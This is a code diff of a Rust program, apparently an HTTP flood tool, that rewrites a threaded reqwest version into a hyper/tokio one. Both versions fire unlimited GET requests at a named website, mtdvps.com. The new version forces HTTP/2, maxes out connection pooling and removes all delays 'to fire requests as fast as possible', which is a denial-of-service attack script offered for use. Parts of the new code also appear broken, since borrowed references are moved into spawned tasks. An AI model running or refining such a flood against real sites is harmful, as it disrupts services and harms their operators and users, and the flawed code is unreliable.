@@ -1,54 +1,61 @@
-use reqwest::Client;
-use std::sync::{Arc, Mutex};
-use std::thread;
-use std::time::{Duration, Instant};
-use futures::executor::block_on;
+use hyper::{Client, Uri};
+use hyper_tls::HttpsConnector;
+use tokio::task;
+use std::sync::atomic::{AtomicU64, Ordering};
+use tokio::time::{interval, Duration};
+use std::sync::Mutex;
+use hyper::StatusCode;
+// 29
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // Create an HTTPS connector with HTTP/2 and TLS
+    let https = HttpsConnector::new();
+    let client = Client::builder()
+        .http2_only(true) // Force HTTP/2 for multiplexing
+        .pool_max_idle_per_host(usize::MAX) // Max out connection pooling
+        .build::<_, hyper::Body>(https);
 
-async fn send_request(client: &Client, url: &str, counter: Arc<Mutex<u64>>) {
-    let _res = client.get(url).send().await;
-    let mut counter = counter.lock().unwrap();
-    *counter += 1;
-}
+    // Target URL
+    let uri: Uri = "https://mtdvps.com".parse()?;
 
-fn main() {
-    let url = "https://mtdvps.com";
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true) // Accept invalid certificates if needed
-        .use_rustls_tls() // Enabling HTTP/2 and TLS using RustLS
-        .build()
-        .unwrap();
+    // Atomic counter for total requests
+    let total_requests = AtomicU64::new(0);
+    // Mutex to store the latest status or error
+    let last_status = Mutex::new(Ok(StatusCode::OK)); // Default to 200 OK
 
-    let counter = Arc::new(Mutex::new(0));
-    let total_requests = Arc::clone(&counter);
+    println!("Starting unlimited GET requests to {} with updates every 10s", uri);
 
-    // Spawn threads to send requests
-    let mut handles = Vec::new();
-    for _ in 0..16 { // Use multiple threads to send requests concurrently
-        let client = client.clone();
-        let counter = Arc::clone(&counter);
-
-        let handle = thread::spawn(move || {
-            loop {
-                block_on(send_request(&client, url, counter.clone()));
-            }
-        });
-        handles.push(handle);
-    }
-
-    // Print the total requests every 10 seconds
-    thread::spawn(move || {
-        let start_time = Instant::now();
+    // Spawn a separate task for periodic updates
+    let total_requests_ref = &total_requests;
+    let last_status_ref = &last_status;
+    task::spawn(async move {
+        let mut ticker = interval(Duration::from_secs(10));
         loop {
-            thread::sleep(Duration::from_secs(10));
-            let total = *total_requests.lock().unwrap();
-            println!("Requests sent in the last 10 seconds: {}", total);
-            println!("Total requests sent: {}", total);
-            *total_requests.lock().unwrap() = 0; // Reset the counter after each 10-second period
+            ticker.tick().await;
+            let total = total_requests_ref.load(Ordering::Relaxed);
+            let status = last_status_ref.lock().unwrap();
+            match *status {
+                Ok(code) => println!("Total requests: {} - Status: {}", total, code),
+                Err(ref e) => println!("Total requests: {} - Error: {}", total, e),
+            }
         }
     });
 
-    // Keep the main thread alive to let the other threads run
+    // Infinite loop for sending requests
     loop {
-        thread::sleep(Duration::from_secs(1));
+        let client = client.clone();
+        let uri = uri.clone();
+        let total_requests = &total_requests;
+        let last_status = &last_status;
+
+        // Spawn a task for each request
+        task::spawn(async move {
+            total_requests.fetch_add(1, Ordering::Relaxed);
+            let result = client.get(uri).await.map(|resp| resp.status());
+            let mut status = last_status.lock().unwrap();
+            *status = result.map_err(|e| e.into());
+        });
+
+        // No delays—fire requests as fast as possible
     }
 }
